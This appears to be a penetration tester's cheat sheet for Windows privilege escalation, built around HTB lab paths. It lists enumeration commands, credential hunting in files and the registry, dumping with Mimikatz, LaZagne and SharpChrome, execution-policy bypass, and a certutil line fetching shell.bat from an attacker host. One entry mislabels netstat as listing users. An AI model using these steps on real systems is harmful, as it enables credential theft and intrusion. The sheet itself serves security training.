# Enumeration

## System Enumeration:

**Display the system’s hostname:** helps identify it among other devices.

```bash
hostname
```

**Display detailed information about the system’s version and OS**

```bash
systeminfo
```

**Check Windows version**

```bash
 wmic os get caption, version, osarchitecture
 systeminfo | findstr /B /C: "OS Name" /C: "OS Version" /C:"System Type"
    
 # wmic ( windows manager instrumentation command line ) 
 # qfe ( quick fix engineering ) 
 # to see whats patched
    
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 wmic logicaldisk get caption,description,providername
```

**Tasklist**

```powershell
tasklist /svc
```

**Display All Environment Variables**

```powershell
set
```

**Display Running process**

```powershell
netstat -ano
```

**Enumerating Always Install Elevated Settings**

```powershell
# any app default install with system privilege
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# if two option enabled then generate MSI payload and execute it to take a reverse shell
```

**Display all service running with local system priv**

```powershell
Get-WmiObject Win32_Service | Where-Object { $_.StartName -eq "LocalSystem" } | Select-Object Name, DisplayName, StartName

```

**Display all service you have Write permission**

```powershell
accesschk.exe /accepteula -uwcqv <userAccount> * > services.txt
# search on privilege for this service 
sc qc <ServiceName>
```

**Collect auto run app**

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

***

## User Enumeration:

**Display Privilege for current user**

```bash
# **Try to run it with local Admin privilege**
whoami /priv
```

**List groups the user belongs to**

```bash
whoami /groups
```

**List all users on the system**

```bash
netstat
```

**Show detailed info about a specific user**

```bash
net user <username>
```

**List members of a local group**

```bash
net localgroup <groupName>
```

**Logged-In Users**

```powershell
query user
```

**Get Password Policy & Other Account Information**

```powershell
net accounts
```

***

## Network Enumeration

**Show full network configuration**

```bash
ipconfig /all	
```

**Show ARP table (IP ↔ MAC mapping)**

```bash
arp -a	
```

**Display system routing table**

```bash
route print
```

**Show active network connections with PIDs4**

```bash
netstat -ano	
```

**Named Pipes**

```powershell
pipelist.exe /accepteula
gci \\.\pipe\
```

**search for all named pipes that allow write access**

```powershell
accesschk.exe -w \pipe\* -v 

# **Checking specifc Named Pipe Permissions**
accesschk.exe -accepteula -w \pipe\<specificName>-v
```

***

## Password Hunting

**Search File Contents for String**

```powershell
# search on password in this extentions
C:\htb> cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt

# display full lines has password
C:\htb> findstr /si password *.xml *.ini *.txt *.config

# display the full line and number of it
C:\htb> findstr /spin "password" *.*

```

**Search for File Extensions**

```powershell
# search on specific file have these names
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

**Search on Password in specific range**

```powershell
Get-ChildItem -Path C:\Users\ -Recurse -File | Select-String -Pattern 'password'
```

**Look for plaintext passwords in Windows setup files**

```bash
type %WINDIR%\Panther\Unattend\Unattended.xml	
```

**User/Computer Description Field**

```powershell
Get-LocalUser
```

**Search for password in register**

```powershell
reg query HKLM /f password /t REG_SZ /s
```

**find admin AutoLogon credentials**

```powershell
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

**Cmdkey Saved Credentials**

```powershell
# use to check if user store credintial in terminal
cmdkey /list
```

**Chrome Dictionary Files**

```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

**PowerShell History File**

```powershell
gc (Get-PSReadLineOption).HistorySavePath
```

**Looking for StickyNotes DB Files**

```powershell
 cd C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState ; ls
```

**Windows Auto-login**

```powershell
# if we found this option enable we can extract cleartext creds
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### SharpChrome

use to  to retrieve cookies and saved logins from Google Chrome.

**Usage**:

* Download [`SharpChrome`](https://github.com/GhostPack/SharpDPAPI)
*   Run the script in PowerShell:

    ```powershell
    .\SharpChrome.exe logins /unprotect
    ```

### **LaZagne**

retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.

**Usage:**

* Download [`LaZagne`](https://github.com/AlessandroZ/LaZagne)
*   Run the script in PowerShell:

    ```powershell
    .\lazagne.exe all
    ```

### **SessionGopher**

We can use it to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials.

Usage:

* Download [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
*   Run the script in PowerShell:

    ```powershell
    Import-Module .\SessionGopher.ps1
    Invoke-SessionGopher -Target WINLPE-SRV01  # target machine name
    ```

***

## AV Enumeration

**Check Windows Defender Status**

```powershell
Get-MpComputerStatus
```

```powershell
sc query windefend	
```

**List AppLocker Rules**

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

**Test AppLocker Policy**

```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\**cmd.exe** -User Everyone
# replace cmd path with any path u wnat check it
```

**List all services, including antivirus software**

```powershell
sc queryex type= service	
```

***

## **Exploring Automated Tools**

### **WinPEAS**

WinPEAS is part of the PEAS (Privilege Escalation Awesome Scripts) suite. It is a script designed to automate the process of finding potential privilege escalation vectors on Windows systems.

**Usage:**

* Download the  [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) file from the repository.
*   Upload the file to the target system and execute it.

    ```powershell
      peas.exe

    ```

### **Sherlock**

Sherlock is a PowerShell script that scans for known vulnerabilities in the Windows operating system that can be exploited for privilege escalation.

**Usage:**

* Download https://github.com/rasta-mouse/Sherlock
*   Run it in a PowerShell session with the command:

    ```powershell
    powershell -ep bypass # move session from cmd to PS
    .\Sherlock.ps1
    ```

### **Watson**

Watson is a vulnerability scanner that helps identify vulnerabilities based on the system’s patch level. It’s used to identify missing patches or configurations that could lead to privilege escalation.

**Usage:**

* Download [`Watson.exe`](https://github.com/rasta-mouse/Watson) or compile it.
*   Run the executable in the system:

    ```powershell
      Watson.exe
    ```

### **PowerUp**

PowerUp is part of PowerSploit, a collection of PowerShell scripts that can be used for post-exploitation. PowerUp specifically looks for privilege escalation opportunities on Windows systems.

**Usage:**

* Download [`PowerUp.ps1`](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc).
*   Run the script in PowerShell:

    ```powershell
     powershell -ep bypass
      .\PowerUp.ps1
    ```

### Seatbelt

Local info gathering (users, creds, configs, escalation paths)

**Usage:**

* Download https://github.com/GhostPack/Seatbelt.git
*   Run the script in PowerShell:

    ```powershell
    Seatbelt.exe all
    ```

### **JAWS (Just Another Windows Script)**

JAWS is a PowerShell script used for post-exploitation and enumeration. It focuses on gathering information about the system, its users, and potential privilege escalation paths.

**Usage:**

* Download [`JAWS-enum.ps1`.](https://github.com/411Hall/JAWS)
*   Run the script in PowerShell:

    ```powershell
      powershell -ep bypass
      .\JAWS-enum.ps1
    ```

### **Mimikatz**

It allows for the extraction of plaintext credentials from memory, password hashes from local SAM/NTDS.dit databases, advanced Kerberos functionality, and more.

Usage:

* Download https://github.com/gentilkiwi/mimikatz
*   Run the script in PowerShell:

    ```powershell
    mimikatz.exe
    privilege::debug
    sekurlsa::logonpasswords
    ```

***

## Transfer Files

### **Certutil**

&#x20;[certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/), whose intended use is for handling certificates but can also be used to transfer files from attacker to victim machine by either downloading a file to disk or base64 encoding/decoding a file.

**Usage:**

*   Run the script in PowerShell:

    ```powershell
    certutil.exe -urlcache -split -f http://AttackerIP:8080/shell.bat shell.bat

    # open HTTP server on attacker box
    ```

***

## Kernel Exploit

Search using KB

```powershell
systeminfo
# to know KBs
```

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
